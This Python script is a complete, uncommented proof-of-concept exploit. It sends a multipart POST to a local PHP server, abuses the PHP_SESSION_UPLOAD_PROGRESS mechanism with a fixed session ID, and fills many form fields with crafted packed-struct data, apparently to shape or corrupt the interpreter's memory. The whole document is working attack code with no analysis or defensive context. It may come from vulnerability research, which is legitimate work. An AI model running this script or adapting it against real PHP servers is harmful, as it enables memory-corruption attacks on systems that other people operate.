#!/usr/bin/env python3
import socket, struct, sys
N=int(sys.argv[1]); L=int(sys.argv[2]); HOST='127.0.0.1'; PORT=8088
pat=(struct.pack('<IIQIIQ',1,10,0x4141414141414141,0x307,0,0)*8)[:L]
parts=[{'name':'PHPSESSID','data':b'attacksessionid0001'},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'}]
for i in range(N): parts.append({'name':'r%d'%i,'data':pat})
b=b'BNDRY12345'; o=bytearray()
for p in parts:
    o+=b'--'+b+b'\r\nContent-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'+p['data']+b'\r\n'
o+=b'--'+b+b'--\r\n'; body=bytes(o)
h=(f'POST /index.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nContent-Type: multipart/form-data; boundary=BNDRY12345\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection((HOST,PORT),timeout=10); s.settimeout(10)
try: s.sendall(h+body)
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
